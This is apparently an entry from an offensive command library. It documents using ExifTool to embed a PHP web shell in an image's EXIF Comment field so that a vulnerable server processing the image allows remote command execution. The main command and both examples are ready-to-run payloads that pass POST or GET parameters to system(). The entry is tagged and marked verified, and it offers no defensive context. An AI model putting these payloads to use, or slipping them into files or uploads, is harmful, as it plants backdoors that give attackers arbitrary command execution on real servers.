---
id: 21bae7ef-4596-4ea0-9009-888894e81e6b
name: exiftool-insert-php-payload-into-metadata
type: command
executor: bash
data: >-
  exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);}
  __halt_compiler();" payload.jpg
output: null
created_at: '2023-04-06T03:56:41.078622+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload
  - php-injection
  - rce
verified: true
validated: true
---

# exiftool-insert-php-payload-into-metadata

## Command

```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" payload.jpg
```

## Description

This command embeds a PHP backdoor into the EXIF Comment field of an image using ExifTool, enabling RCE via POST requests when the image is processed on a vulnerable server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Comment="<?php ... __halt_compiler();" | The PHP payload string to insert into the comment | Yes |
| payload.jpg | Target image file to modify | Yes |

## Examples

### Basic Usage

```bash
exiftool -Comment="<?php system('id'); ?>" image.jpg
```

### Advanced Usage

```bash
exiftool -Comment="<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>" -overwrite_original image.jpg
```

## Expected Output

Terminal: "1 image files updated" with tag details. Verify injection with exiftool -Comment payload.jpg, which should echo the full PHP code.

## Related

- [[Related Procedure|procedures/Inject-PHP-Code-into-Image-Metadata-for-RCE]]
- [[Related Tool|tools/ExifTool]]
